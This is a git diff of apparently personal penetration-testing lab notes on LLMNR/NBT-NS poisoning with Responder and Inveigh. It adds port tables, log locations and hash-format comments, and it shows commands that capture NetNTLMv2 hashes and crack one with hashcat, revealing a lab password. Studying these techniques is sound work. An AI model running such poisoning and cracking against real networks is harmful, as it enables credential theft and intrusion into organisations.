@@ -30,26 +30,30 @@ The goal is to capture **NetNTLMv1** and **NetNTLMv2** hashes (==challenge-respo
 - **Metasploit** : Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.
 
 Both tools can be used to attack the following protocols:
-
-- LLMNR
-- DNS
-- MDNS
-- NBNS
-- DHCP
-- ICMP
-- HTTP
-- HTTPS
-- SMB
-- LDAP
-- WebDAV
-- Proxy Auth
+```bash
+LLMNR        - UDP 5355
+DNS          - UDP/TCP 53
+mDNS         - UDP 5353
+NBNS (NetBIOS Name Service)
+             - UDP 137
+DHCP         - UDP 67 (server), UDP 68 (client)
+ICMP         - IP protocol 1 (no ports; ICMP messages, not port-based)
+HTTP         - TCP 80
+HTTPS        - TCP 443
+SMB          - TCP 445 (modern SMB), TCP 139 (NetBIOS over TCP/legacy)
+LDAP         - TCP/UDP 389 (LDAP), TCP 636 (LDAPS - LDAP over TLS)
+WebDAV       - Typically over HTTP/HTTPS -> TCP 80 / TCP 443
+Proxy Auth   - HTTP proxy authentication (HTTP 407); common proxy ports TCP 3128, 8080, 8000, 8888 (varies)
 
 Responder also has support for:
+MSSQL        - TCP 1433
+DCE-RPC      - TCP 135 (RPC endpoint mapper) and dynamic high ports (e.g. 49152–65535 / ephemeral)
+FTP          - TCP 21 (control), TCP 20 (data for active FTP)
+POP3         - TCP 110 (POP3), TCP 995 (POP3S over TLS)
+IMAP         - TCP 143 (IMAP), TCP 993 (IMAPS over TLS)
+SMTP         - TCP 25 (SMTP), TCP 465 (SMTPS legacy), TCP 587 (submission)
 
-- MSSQL
-- DCE-RPC
-- FTP, POP3, IMAP, and SMTP auth
-
+```
 #### Using Responder  
 > must run the tool with sudo privileges or as root
 
@@ -73,6 +77,7 @@ responder -h
 
 ## Starting Responder with Default Settings
   sudo responder -I ens224 
+    # hashes saved in /usr/share/responder/logs , formate (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt
   # we can pass these hashes to Hashcat using hash modes:
     # NetNTLMv2 => 5600 
     # NetNTLMv1 => 5500
@@ -93,6 +98,7 @@ Once we have enough, we need to get these hashes into a usable format for us rig
  hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 # Status...........: Cracked
 #FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
+# <username>::<domain>:<server_challenge_hex>:<ntlmv2_response_blob_hex>
 ```
 ==RESULTS:==
 - **User: FOREND, Password: Klmcargo2**
@@ -129,12 +135,16 @@ Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 `Inveigh.exe (binary version):`
 ```powershell
 # run capturing hashes as defaults 
-.\Inveigh.exe 
+.\Inveigh.exe -fileoutput Y
 
 entre [esc] # enter the console while Inveigh is running.
 HELP 
 GET NTLMV2  # get captured NTLMv2 hashes; add search string to filter results
 GET NTLMV2USERNAMES # get usernames and source IPs/hostnames for captured NTLMv2 hashes
+ # with -fileoutput Y u will saved the hashes : 
+ # Inveigh-NTLMv2.txt : SourceIP, Hostname, DOMAIN\username, short-hex
+ # Inveigh-NTLMv2Users.txt : <username>::<domain>:<server_challenge_hex>:<ntlmv2_response_blob_hex>
+ 
 ```
 
 ---
